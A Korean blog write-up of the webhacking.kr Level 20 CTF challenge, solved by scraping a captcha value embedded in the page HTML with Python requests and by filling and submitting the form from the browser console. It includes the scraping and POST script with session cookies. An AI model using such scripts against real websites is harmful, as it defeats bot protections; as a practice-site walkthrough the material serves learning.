---
layout: post
title: Webhacking.kr | Level 20
subtitle: Webhacking CTF Problem Solving
categories: Webhacking.kr
tags: [Pentest, Web]
---

**본 문제는 [webhacking.kr](https://webhacking.kr)를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/205825391-dc40a54c-dcf3-4a8d-be0e-8324276e14a8.png" width = 400> 
</p>

접속하면 입력해야 할 **nickname, comment, captcha** 세 부분이 존재하는데 최상단을 보면 **time limit : 2 second** 시간 제한은 2초로 되어 있다.

**captcha**로 인해서 2초내에 입력은 불가능할 것으로 보인다.

따라서, `python requests`를 이용해 해당 값을 자동으로 집어넣고 Submit하는 Exploit을 작성해보고자 한다.

## 문제 풀이

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/205825840-2089f334-4061-4732-bc27-f70427d75a1e.png" width = 360> 
</p>

입력 값을 넣고 submit 하는것을 Burp Suite로 잡았을 때의 모습이다.

POST 방식을 이용하고 **Body**에 들어가는 변수로는 **id, cmt, captcha**인 것을 알 수 있다.

python을 이용해서 해당 리소스들이 어떤 식으로 존재하는 지 확인해본다.

```python
import requests

url = 'https://webhacking.kr/challenge/code-4/'

r = requests.get(url)
print(r.text)
```

```html
<html>
<head>
<title>Challenge 20</title>
<style type="text/css">
body { background:black; color:white; font-size:10pt; }
input { background:silver; color:black; font-size:9pt; }
</style>
</head>
<body>
<center><font size=2>time limit : 2 second</font></center>
<form name=lv5frm method=post>
<table border=0>
<tr><td>nickname</td><td><input type=text name=id size=10 maxlength=10></td></tr>       
<tr><td>comment</td><td><input type=text name=cmt size=50 maxlength=50></td></tr>       
<tr><td>captcha</td><td><input type=text name=captcha><input type=button name=captcha_ value="C3t9ybswHJ" style="border:0;background=lightgreen"></td></tr>
<tr><td><input type=button value=Submit onclick=ck()></td><td><input type=reset value=reset></td></tr>
</table>
<script>
function ck(){
  if(lv5frm.id.value=="") { lv5frm.id.focus(); return; }
  if(lv5frm.cmt.value=="") { lv5frm.cmt.focus(); return; }
  if(lv5frm.captcha.value=="") { lv5frm.captcha.focus(); return; }
  if(lv5frm.captcha.value!=lv5frm.captcha_.value) { lv5frm.captcha.focus(); return; }   
  lv5frm.submit();
}
</script>
</body>
</html>
```

모든 내용을 `\n` 기준으로 `split`하고 captcha가 있는 부분을 인덱싱하여 값을 가져오면 된다.

이제 Burp Suite로 잡았던 것 처럼 값을 담아서 POST 보내보겠습니다.

```python
import requests

url = 'https://webhacking.kr/challenge/code-4/'

cookies = {
    'st' : '1670306429',
    'PHPSESSID' : 'd80585g759loihj05an8vqdenh'
}
r = requests.get(url)

lst = (r.text).split('\n')

captcha = lst[14][94:104]
print(captcha)

data = {
    'id' : '1',
    'cmt' : '1',
    'captcha' : captcha
}

r = requests.post(url, cookies = cookies, data = data)

print(r.text)
```

**하지만, captcah라는 것은 컴퓨터와 사람을 구분짓기 위한 완전 자동 튜링 테스트로, 웹사이트에서 사람이 접근하려고 하는 것인지 봇이 접근하는 것인지 판단하기 위하여 사용되는 테스트다.**

즉, Exploit을 날리게되면 컴퓨터인지 사람인지 구분하는 테스트를 진행할 수 없기 때문에 다시 접근해야 한다.

```javascript
function ck(){
  if(lv5frm.id.value=="") { lv5frm.id.focus(); return; }
  if(lv5frm.cmt.value=="") { lv5frm.cmt.focus(); return; }
  if(lv5frm.captcha.value=="") { lv5frm.captcha.focus(); return; }
  if(lv5frm.captcha.value!=lv5frm.captcha_.value) { lv5frm.captcha.focus(); return; }
  lv5frm.submit();
}
```

개발자도구를 켜고 스크립트를 보면 값을 보낼 때 누르는 Submit에 **onclick = ck()**이 있다.

개발자도구 콘솔을 이용해 captcha의 값을 읽은 동시에 값을 넣고 강제로 Submit을 할 수 있을 것이다.

```javascript
lv5frm.id.value = "1"
lv5frm.cmt.value = "1"
lv5frm.captcha.value = lv5frm.captcha_.value
lv5frm.submit();
```

새로고침하고 해당 값을 엔터하면 해결이 된다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/205836357-46da40de-eac1-416b-8b52-9c7267f282ab.png" width = 400> 
</p>